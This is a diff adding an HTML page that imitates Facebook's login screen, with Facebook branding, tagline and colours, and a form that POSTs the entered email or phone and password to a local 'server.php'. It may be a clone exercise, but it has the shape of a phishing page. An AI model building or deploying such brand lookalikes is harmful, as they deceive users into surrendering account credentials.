@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Facebook Login</title>
+    <style>
+      body {
+        margin: 0;
+        font-family: Arial, sans-serif;
+        background-color: #f0f2f5;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+      }
+
+      .container {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        max-width: 980px;
+        width: 100%;
+        padding: 20px;
+      }
+
+      .content-left {
+        max-width: 50%;
+      }
+
+      .content-left h1 {
+        color: #1877f2;
+        font-size: 48px;
+        font-weight: bold;
+        margin-bottom: 10px;
+      }
+
+      .content-left p {
+        font-size: 20px;
+        color: #606770;
+      }
+
+      .content-right {
+        background: white;
+        border-radius: 8px;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        padding: 20px;
+        width: 100%;
+        max-width: 400px;
+      }
+
+      .content-right form {
+        display: flex;
+        flex-direction: column;
+      }
+
+      .input-group {
+        margin-bottom: 15px;
+      }
+
+      .input-group input {
+        width: 100%;
+        padding: 10px;
+        border: 1px solid #dddfe2;
+        border-radius: 5px;
+        font-size: 16px;
+      }
+
+      .login-btn {
+        background-color: #1877f2;
+        color: white;
+        font-size: 18px;
+        font-weight: bold;
+        padding: 10px;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+      }
+
+      .login-btn:hover {
+        background-color: #145dbf;
+      }
+
+      .forgot-password {
+        text-align: center;
+        margin-top: 10px;
+        font-size: 14px;
+      }
+
+      .forgot-password a {
+        color: #1877f2;
+        text-decoration: none;
+      }
+
+      .forgot-password a:hover {
+        text-decoration: underline;
+      }
+
+      .signup {
+        text-align: center;
+        margin-top: 20px;
+        font-size: 14px;
+      }
+
+      .signup a {
+        color: #42b72a;
+        text-decoration: none;
+        font-weight: bold;
+      }
+
+      .signup a:hover {
+        text-decoration: underline;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="content-left">
+        <h1>facebook</h1>
+        <p>
+          Facebook helps you connect and share with the people in your life.
+        </p>
+      </div>
+      <div class="content-right">
+        <form action="server.php" method="POST">
+          <div class="input-group">
+            <input
+              type="text"
+              name="email"
+              placeholder="Email or phone number"
+              required
+            />
+          </div>
+          <div class="input-group">
+            <input
+              type="password"
+              name="password"
+              placeholder="Password"
+              required
+            />
+          </div>
+          <button class="login-btn" type="submit">Log In</button>
+          <div class="forgot-password">
+            <a href="forgotten.html">Forgotten password?</a>
+          </div>
+        </form>
+      </div>
+    </div>
+  </body>
+</html>
